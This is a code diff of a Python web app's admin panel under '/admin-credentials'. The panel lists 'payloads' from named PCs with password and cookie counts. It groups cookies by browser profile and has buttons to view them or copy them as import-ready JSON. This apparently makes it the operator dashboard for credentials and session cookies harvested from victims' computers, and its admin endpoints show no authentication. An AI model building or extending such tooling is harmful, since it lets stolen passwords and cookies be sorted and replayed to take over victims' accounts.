+      if (!res.ok) throw new Error("Could not load cookies");
+      const data = await res.json();
+      return data.cookies || [];
+    }}
+
+    function openCookieModal(profile, cookies) {{
+      modalCookies = cookies;
+      modalImportJson = JSON.stringify(cookiesToImportJson(cookies), null, 2);
+      cookieModalTitle.textContent = `${{profile}} · ${{cookies.length}} cookies`;
+      cookieModalView.textContent = JSON.stringify(cookies, null, 2);
+      cookieModalStatus.textContent = "";
+      cookieModalBackdrop.hidden = false;
+      document.body.style.overflow = "hidden";
+    }}
+
+    function closeCookieModal() {{
+      cookieModalBackdrop.hidden = true;
+      document.body.style.overflow = "";
+      cookieModalStatus.textContent = "";
+    }}
+
+    document.querySelectorAll(".view-cookies-btn").forEach((button) => {{
+      button.addEventListener("click", async () => {{
+        button.disabled = true;
+        try {{
+          const cookies = await fetchProfileCookies(button.dataset.profile);
+          openCookieModal(button.dataset.profile, cookies);
+        }} catch (e) {{
+          alert("Could not load cookies for this profile.");
+        }} finally {{
+          button.disabled = false;
+        }}
+      }});
+    }});
+
+    document.querySelectorAll(".copy-cookies-btn").forEach((button) => {{
+      button.addEventListener("click", async () => {{
+        button.disabled = true;
+        try {{
+          const cookies = await fetchProfileCookies(button.dataset.profile);
+          const importJson = JSON.stringify(cookiesToImportJson(cookies), null, 2);
+          await copyText(importJson, null, button);
+        }} catch (e) {{
+          alert("Could not copy cookies for this profile.");
+        }} finally {{
+          button.disabled = false;
+        }}
+      }});
+    }});
+
+    cookieModalCopyJson.addEventListener("click", () => {{
+      copyText(JSON.stringify(modalCookies, null, 2), cookieModalStatus, null);
+    }});
+
+    cookieModalCopyImport.addEventListener("click", () => {{
+      copyText(modalImportJson, cookieModalStatus, null);
+    }});
+
+    cookieModalClose.addEventListener("click", closeCookieModal);
+    cookieModalBackdrop.addEventListener("click", (event) => {{
+      if (event.target === cookieModalBackdrop) closeCookieModal();
+    }});
+    document.addEventListener("keydown", (event) => {{
+      if (event.key === "Escape" && !cookieModalBackdrop.hidden) closeCookieModal();
+    }});
+  </script>"""
+
+    return HTMLResponse(
+        render_layout(
+            title=f"Record #{payload_id}",
+            active_tab="records",
+            content=content,
+            scripts=scripts,
+        )
+    )
+
+
+@router.get("/admin-credentials/pcs", response_class=HTMLResponse)
+async def admin_pcs_page() -> HTMLResponse:
+    content = """
+  <div class="container">
     <div class="toolbar">
       <label>
         Environment
@@ -368,51 +1010,12 @@ _ADMIN_HTML = """<!DOCTYPE html>
         <button type="button" id="pcs-next-btn">Next</button>
       </div>
     </div>
-  </div>
+  </div>"""
 
-  <div id="modal-backdrop" class="modal-backdrop" hidden>
-    <div class="modal" role="dialog" aria-modal="true">
-      <div class="modal-header">
-        <div class="modal-title" id="modal-title"></div>
-        <div class="modal-actions">
-          <button type="button" id="copy-btn" class="primary">Copy JSON</button>
-          <button type="button" id="close-btn">Close</button>
-        </div>
-      </div>
-      <div class="modal-body">
-        <pre id="json-view"></pre>
-        <div class="status" id="copy-status"></div>
-      </div>
-    </div>
-  </div>
-
+    scripts = """
   <script>
-    const envFilter = document.getElementById("env-filter");
-    const pcFilter = document.getElementById("pc-filter");
-    const tableBody = document.getElementById("table-body");
-    const tableEmpty = document.getElementById("table-empty");
-    const paginationInfo = document.getElementById("pagination-info");
-    const pageIndicator = document.getElementById("page-indicator");
-    const prevBtn = document.getElementById("prev-btn");
-    const nextBtn = document.getElementById("next-btn");
-    const refreshBtn = document.getElementById("refresh-btn");
-    const modalBackdrop = document.getElementById("modal-backdrop");
-    const modalTitle = document.getElementById("modal-title");
-    const jsonView = document.getElementById("json-view");
-    const copyBtn = document.getElementById("copy-btn");
-    const closeBtn = document.getElementById("close-btn");
-    const copyStatus = document.getElementById("copy-status");
-
-    const PAGE_SIZE = 20;
-    let currentPage = 1;
-    let totalPages = 0;
-    let pcsCurrentPage = 1;
-    let pcsTotalPages = 0;
-    let currentJson = "";
-
-    const tabs = document.querySelectorAll(".tab");
-    const recordsPanel = document.getElementById("records-panel");
-    const pcsPanel = document.getElementById("pcs-panel");
+    const DEFAULT_ENVIRONMENT = __DEFAULT_ENVIRONMENT__;
+    const adminFetch = (url, options = {}) => fetch(url, { credentials: "same-origin", ...options });
     const pcsEnvFilter = document.getElementById("pcs-env-filter");
     const pcsTableBody = document.getElementById("pcs-table-body");
     const pcsTableEmpty = document.getElementById("pcs-table-empty");
@@ -422,91 +1025,34 @@ _ADMIN_HTML = """<!DOCTYPE html>
     const pcsNextBtn = document.getElementById("pcs-next-btn");
     const pcsRefreshBtn = document.getElementById("pcs-refresh-btn");
 
-    function escapeHtml(value) {
-      return String(value)
-        .replaceAll("&", "&amp;")
-        .replaceAll("<", "&lt;")
-        .replaceAll(">", "&gt;")
-        .replaceAll('"', "&quot;");
-    }
+    const PAGE_SIZE = 20;
+    let pcsCurrentPage = 1;
+    let pcsTotalPages = 0;
 
-    async function loadFilters() {
-      const env = envFilter.value || "production";
-      const res = await fetch(`/admin-credentials/filters?environment=${encodeURIComponent(env)}`);
+    async function loadPcsFilters() {
+      const env = pcsEnvFilter.value || DEFAULT_ENVIRONMENT;
+      const res = await adminFetch(`/admin-credentials/filters?environment=${encodeURIComponent(env)}`);
       const data = await res.json();
-
-      const prevEnv = envFilter.value;
-      envFilter.innerHTML = "";
-      const envs = data.environments.length ? data.environments : ["production"];
+      const prevEnv = pcsEnvFilter.value;
+      pcsEnvFilter.innerHTML = "";
+      const envs = data.environments.length ? data.environments : [DEFAULT_ENVIRONMENT];
       for (const e of envs) {
         const opt = document.createElement("option");
         opt.value = e;
         opt.textContent = e;
-        envFilter.appendChild(opt);
+        pcsEnvFilter.appendChild(opt);
       }
-      envFilter.value = envs.includes(prevEnv) ? prevEnv : (envs.includes("production") ? "production" : envs[0]);
-
-      const prevPc = pcFilter.value;
-      pcFilter.innerHTML = '<option value="">All</option>';
-      for (const pc of data.pc_names) {
-        const opt = document.createElement("option");
-        opt.value = pc;
-        opt.textContent = pc;
-        pcFilter.appendChild(opt);
-      }
-      pcFilter.value = [...pcFilter.options].some(o => o.value === prevPc) ? prevPc : "";
-    }
-
-    async function loadList(page = currentPage) {
-      currentPage = page;
-      const params = new URLSearchParams();
-      params.set("environment", envFilter.value || "production");
-      params.set("page", String(currentPage));
-      params.set("page_size", String(PAGE_SIZE));
-      if (pcFilter.value) params.set("pc_name", pcFilter.value);
-
-      const res = await fetch(`/admin-credentials/payloads?${params}`);
-      const data = await res.json();
-
-      totalPages = data.total_pages;
-      tableBody.innerHTML = "";
-      tableEmpty.hidden = data.total > 0;
-
-      for (const item of data.items) {
-        const tr = document.createElement("tr");
-        const tagHtml = item.tag
-          ? `<span class="tag-pill">${escapeHtml(item.tag)}</span>`
-          : `<span class="tag-muted">—</span>`;
-        tr.innerHTML = `
-          <td class="mono">#${item.id}</td>
-          <td>${escapeHtml(item.pc_name)}</td>
-          <td>${tagHtml}</td>
-          <td>${escapeHtml(item.environment)}</td>
-          <td class="mono">${escapeHtml(item.datetime)}</td>
-          <td>${item.password_count ?? 0}</td>
-          <td>${item.cookie_count ?? 0}</td>`;
-        tr.addEventListener("click", () => openModal(item.id));
-        tableBody.appendChild(tr);
-      }
-
-      const start = data.total ? (data.page - 1) * data.page_size + 1 : 0;
-      const end = Math.min(data.page * data.page_size, data.total);
-      paginationInfo.textContent = data.total
-        ? `Showing ${start}–${end} of ${data.total}`
-        : "No results";
-      pageIndicator.textContent = data.total ? `Page ${data.page} of ${data.total_pages}` : "";
-      prevBtn.disabled = data.page <= 1;
-      nextBtn.disabled = data.page >= data.total_pages;
+      pcsEnvFilter.value = envs.includes(prevEnv) ? prevEnv : (envs.includes(DEFAULT_ENVIRONMENT) ? DEFAULT_ENVIRONMENT : envs[0]);
     }
 
     async function loadPcs(page = pcsCurrentPage) {
       pcsCurrentPage = page;
       const params = new URLSearchParams();
-      params.set("environment", pcsEnvFilter.value || "production");
+      params.set("environment", pcsEnvFilter.value || DEFAULT_ENVIRONMENT);
       params.set("page", String(pcsCurrentPage));
       params.set("page_size", String(PAGE_SIZE));
 
-      const res = await fetch(`/admin-credentials/pcs?${params}`);
+      const res = await adminFetch(`/admin-credentials/api/pcs?${params}`);
       const data = await res.json();
 
       pcsTotalPages = data.total_pages;
@@ -530,7 +1076,6 @@ _ADMIN_HTML = """<!DOCTYPE html>
         input.type = "text";
         input.value = item.tag || "";
         input.placeholder = "e.g. Office laptop";
-        input.dataset.pcId = String(item.id);
         tagTd.appendChild(input);
         tr.appendChild(tagTd);
 
@@ -539,8 +1084,7 @@ _ADMIN_HTML = """<!DOCTYPE html>
         actions.className = "row-actions";
         const saveBtn = document.createElement("button");
         saveBtn.type = "button";
-        saveBtn.className = "primary save-pc-btn";
-        saveBtn.dataset.pcId = String(item.id);
+        saveBtn.className = "primary";
         saveBtn.textContent = "Save";
         const status = document.createElement("span");
         status.className = "save-status";
@@ -553,14 +1097,13 @@ _ADMIN_HTML = """<!DOCTYPE html>
           e.stopPropagation();
           status.textContent = "";
           status.style.color = "#22c55e";
-          const res = await fetch(`/admin-credentials/pcs/${item.id}`, {
+          const res = await adminFetch(`/admin-credentials/pcs/${item.id}`, {
             method: "PUT",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ tag: input.value }),
           });
           if (res.ok) {
             status.textContent = "Saved";
-            if (!recordsPanel.hidden) await loadList(currentPage);
           } else {
             status.textContent = "Error";
             status.style.color = "#ef4444";
@@ -580,82 +1123,6 @@ _ADMIN_HTML = """<!DOCTYPE html>
       pcsNextBtn.disabled = data.page >= data.total_pages;
     }
 
-    async function loadPcsFilters() {
-      const env = pcsEnvFilter.value || "production";
-      const res = await fetch(`/admin-credentials/filters?environment=${encodeURIComponent(env)}`);
-      const data = await res.json();
-      const prevEnv = pcsEnvFilter.value;
-      pcsEnvFilter.innerHTML = "";
-      const envs = data.environments.length ? data.environments : ["production"];
-      for (const e of envs) {
-        const opt = document.createElement("option");
-        opt.value = e;
-        opt.textContent = e;
-        pcsEnvFilter.appendChild(opt);
-      }
-      pcsEnvFilter.value = envs.includes(prevEnv) ? prevEnv : (envs.includes("production") ? "production" : envs[0]);
-    }
-
-    function switchTab(name) {
-      tabs.forEach((tab) => tab.classList.toggle("active", tab.dataset.tab === name));
-      recordsPanel.hidden = name !== "records";
-      pcsPanel.hidden = name !== "pcs";
-    }
-
-    tabs.forEach((tab) => {
-      tab.addEventListener("click", async () => {
-        switchTab(tab.dataset.tab);
-        if (tab.dataset.tab === "pcs") {
-          await loadPcsFilters();
-          await loadPcs(1);
-        }
-      });
-    });
-
-    async function openModal(id) {
-      copyStatus.textContent = "";
-      const res = await fetch(`/admin-credentials/payloads/${id}`);
-      if (!res.ok) return;
-      const data = await res.json();
-      currentJson = JSON.stringify(data.content, null, 2);
-      modalTitle.textContent = `${data.pc_name} · ${data.datetime}`;
-      jsonView.textContent = currentJson;
-      modalBackdrop.hidden = false;
-      document.body.style.overflow = "hidden";
-    }
-
-    function closeModal() {
-      modalBackdrop.hidden = true;
-      document.body.style.overflow = "";
-      copyStatus.textContent = "";
-    }
-
-    async function copyJson() {
-      copyStatus.textContent = "";
-      try {
-        await navigator.clipboard.writeText(currentJson);
-        copyStatus.textContent = "Copied";
-      } catch (e) {
-        const textarea = document.createElement("textarea");
-        textarea.value = currentJson;
-        textarea.style.position = "fixed";
-        textarea.style.opacity = "0";
-        document.body.appendChild(textarea);
-        textarea.select();
-        copyStatus.textContent = document.execCommand("copy") ? "Copied" : "Could not copy";
-        textarea.remove();
-      }
-    }
-
-    envFilter.addEventListener("change", async () => {
-      await loadFilters();
-      await loadList(1);
-    });
-    pcFilter.addEventListener("change", () => loadList(1));
-    refreshBtn.addEventListener("click", async () => {
-      await loadFilters();
-      await loadList(1);
-    });
     pcsEnvFilter.addEventListener("change", async () => {
       await loadPcsFilters();
       await loadPcs(1);
@@ -670,28 +1137,101 @@ _ADMIN_HTML = """<!DOCTYPE html>
     pcsNextBtn.addEventListener("click", () => {
       if (pcsCurrentPage < pcsTotalPages) loadPcs(pcsCurrentPage + 1);
     });
-    prevBtn.addEventListener("click", () => {
-      if (currentPage > 1) loadList(currentPage - 1);
-    });
-    nextBtn.addEventListener("click", () => {
-      if (currentPage < totalPages) loadList(currentPage + 1);
-    });
-    copyBtn.addEventListener("click", copyJson);
-    closeBtn.addEventListener("click", closeModal);
-    modalBackdrop.addEventListener("click", (e) => {
-      if (e.target === modalBackdrop) closeModal();
-    });
-    document.addEventListener("keydown", (e) => {
-      if (e.key === "Escape" && !modalBackdrop.hidden) closeModal();
-    });
 
     (async () => {
-      await loadFilters();
-      if (!envFilter.value) envFilter.value = "production";
       await loadPcsFilters();
-      if (!pcsEnvFilter.value) pcsEnvFilter.value = "production";
-      await loadList(1);
+      if (!pcsEnvFilter.value) pcsEnvFilter.value = DEFAULT_ENVIRONMENT;
+      await loadPcs(1);
     })();
-  </script>
-</body>
-</html>"""
+  </script>"""
+
+    scripts = scripts.replace("__DEFAULT_ENVIRONMENT__", json.dumps(ENVIRONMENT))
+
+    return HTMLResponse(render_layout(title="PCs", active_tab="pcs", content=content, scripts=scripts))
+
+
+@router.get("/admin-credentials/payloads")
+async def admin_list_payloads(
+    environment: str = Query(default=ENVIRONMENT),
+    pc_name: str | None = Query(default=None),
+    page: int = Query(default=1, ge=1),
+    page_size: int = Query(default=20, ge=1, le=100),
+) -> JSONResponse:
+    items, total = list_payloads(
+        environment=environment or None,
+        pc_name=pc_name or None,
+        page=page,
+        page_size=page_size,
+    )
+    total_pages = (total + page_size - 1) // page_size if total else 0
+    return JSONResponse(
+        {
+            "items": items,
+            "total": total,
+            "page": page,
+            "page_size": page_size,
+            "total_pages": total_pages,
+        }
+    )
+
+
+@router.get("/admin-credentials/payloads/{payload_id}/cookies")
+async def admin_get_profile_cookies(
+    payload_id: int,
+    profile: str = Query(..., min_length=1),
+) -> JSONResponse:
+    payload = get_payload_by_id(payload_id)
+    if payload is None:
+        return JSONResponse({"error": "not found"}, status_code=404)
+
+    cookies_by_profile = group_cookies_by_profile(payload["content"])
+    cookies = cookies_by_profile.get(profile)
+    if cookies is None:
+        return JSONResponse({"error": "profile not found"}, status_code=404)
+
+    return JSONResponse({"profile": profile, "cookies": cookies, "count": len(cookies)})
+
+
+@router.get("/admin-credentials/payloads/{payload_id}")
+async def admin_get_payload(payload_id: int) -> JSONResponse:
+    payload = get_payload_by_id(payload_id)
+    if payload is None:
+        return JSONResponse({"error": "not found"}, status_code=404)
+    return JSONResponse(payload)
+
+
+@router.get("/admin-credentials/filters")
+async def admin_filters(environment: str = Query(default=ENVIRONMENT)) -> JSONResponse:
+    return JSONResponse(
+        {
+            "environments": list_distinct_environments(),
+            "pc_names": list_distinct_pc_names(environment=environment or None),
+        }
+    )
+
+
+@router.get("/admin-credentials/api/pcs")
+async def admin_list_pcs_api(
+    environment: str = Query(default=ENVIRONMENT),
+    page: int = Query(default=1, ge=1),
+    page_size: int = Query(default=20, ge=1, le=100),
+) -> JSONResponse:
+    items, total = list_pcs(environment=environment or None, page=page, page_size=page_size)
+    total_pages = (total + page_size - 1) // page_size if total else 0
+    return JSONResponse(
+        {
+            "items": items,
+            "total": total,
+            "page": page,
+            "page_size": page_size,
+            "total_pages": total_pages,
+        }
+    )
+
+
+@router.put("/admin-credentials/pcs/{pc_id}")
+async def admin_update_pc(pc_id: int, body: PcTagBody) -> JSONResponse:
+    updated = update_pc_tag(pc_id, body.tag)
+    if updated is None:
+        return JSONResponse({"error": "not found"}, status_code=404)
+    return JSONResponse(updated)
